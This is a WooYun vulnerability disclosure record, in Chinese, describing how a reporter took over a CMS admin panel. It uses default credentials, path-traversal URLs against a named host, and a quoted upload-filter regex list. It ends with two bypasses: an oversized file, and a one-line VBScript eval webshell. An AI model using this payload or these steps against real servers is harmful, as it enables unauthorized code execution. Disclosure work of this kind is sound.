{"id": 8251, "wybug_id": "wooyun-2013-034434", "wybug_title": "传承链接管理系统后台存在任意文件读取漏洞+上传检查不严谨可Getshell（读取源码逻辑绕过限制）", "wybug_corp": "pplms.com", "wybug_author": "HRay", "wybug_date": "2013-08-15 18:14", "wybug_open_date": "2013-11-13 18:15", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-13：\t细节向公众公开  简要描述： 传承旗下-哇哇网址存在弱口令可进入后台续-忽视真的不代表没问题 详细说明：  习惯性的点开“对我公开的漏洞”,发现 WooYun: 传承旗下-哇哇网址存在弱口令可进入后台 然后看到厂商回复“根本就上传不了，还有这个是演示后台弱口令正常，并没有使用的!”ok，既然是后台演示，那咱就进去看看，是否能拿到shell访问http://pplms.cn/x/admin/IndexManage.asp  admin  admin888进入后台长话短说，直接上问题1.模板管理处对CurrPath参数过滤不当导致可以遍历上级目录http://pplms.cn/x/admin/Template/TemplateManage.asp?CurrPath=%2Fx%2F\n\n也可以直接查看文件内容，如http://pplms.cn/x/admin/Template/Template.asp?Action=Modify&FileName=Config%2Easp&CurrPath=%2Fx%2FConfig\n\n按说这里应该是编辑内容的，但是限制了可保存的文件名，文件名不能出现; 并且路径中也不能出现x.asp这种，就算你建立了x.asp这样的目录也不能在这里拿shell2.结合1，虽然不能直接拿shell，但是支持我们新建一个1.asp的目录名，系统本身有上传文件管理的功能\n\n我开始的想法是直接传jpg到1.asp目录里，但是文件内容也有检查限制\n\n我们利用漏洞1读一下相关的代码，文件类型限制之类的就不看了，只看内容检查的地方,代码如下\n'检查文件内容的是否合法Function  CheckFileContent(byval path,byval FileSize)    Dim kk,NoAllowExtArr\tNoAllowExtArr=Split(NoAllowExt,\"|\")\tFor kk=0 To Ubound(NoAllowExtArr)\t    If InStr(LCase(path),\".\" & NoAllowExtArr(kk))<>0 Then\t\t   Call PCls.DeleteFile(path)'删除指定文件\t\t   CheckFileContent= \"文件上传失败,文件名不合法\"\t\t   Exit Function\t\tEnd If\tNext\tIf FileSize>50 Then Exit Function  '超过50K跳过检测\t\tOn Error Resume Next\tDim FindContent,regEx,FoundTF\tFindContent=PCls.ReadFromFile(Replace(path,PCls.Setting(2),\"\"))\tIf Err Then Exit Function:Err.Clear\tFoundTF=false\tSet regEx = New RegExp\tregEx.IgnoreCase = True\tregEx.Global = True\t\tregEx.Pattern = \"@\\s*LANGUAGE\\s*=\\s*[\"\"]?\\s*(vbscript|jscript|javascript).encode\\b\"\tIf regEx.Test(FindContent) Then\t   FoundTF=true\tEnd If\tregEx.Pattern = \"execute\\s*request\"\tIf regEx.Test(FindContent) Then\t   FoundTF=true\tEnd If\tregEx.Pattern = \"executeglobal\\s*request\"\tIf regEx.Test(FindContent) Then\t   FoundTF=true\tEnd If\tregEx.Pattern = \"<script.*runat.*server(\\n|.)*execute(\\n|.)*<\\/script>\"\tIf regEx.Test(FindContent) Then\t   FoundTF=true\tEnd If\tregEx.Pattern = \"\\<%(.|\\n)*%\\>\"\tIf regEx.Test(FindContent) Then\t   FoundTF=true\tEnd If\tIf InStr(LCase(FindContent),\"scripting.filesystemobject\")<>0 or instr(lcase(FindContent),\"adodb.stream\")<>0 Then\t   FoundTF=true\tEnd If\tSet regEx=nothing\tIf FoundTF Then\t   PCls.DeleteFile(path)\t   CheckFileContent=\"系统检查到您上传的文件可能存在危险代码，不允许上传！\"\tEnd If\tEnd Function\n这里我们有两种绕过的方法1是直接上传一个大于50k的2是上传如下代码的一句话\n<script language=VBScript runat=server>eval request(\"a\")</Script>\n正则匹配忽略了大小写两种方式我们均上传成功但是我发现默认会生成一个1asp的文件夹，而并非长传至1.asp，这个简单，利用模板管理的强大功能，把1asp目录重命名为1.asp就ok了最终拿到了webshell\n\n   漏洞证明：  \n\n   修复方案：  厂商还是有一定的安全意识的，如何修复我想也不用我多说了   版权声明：转载请注明来源 HRay@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-16 15:34 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-25 16:20 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  很可乐    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}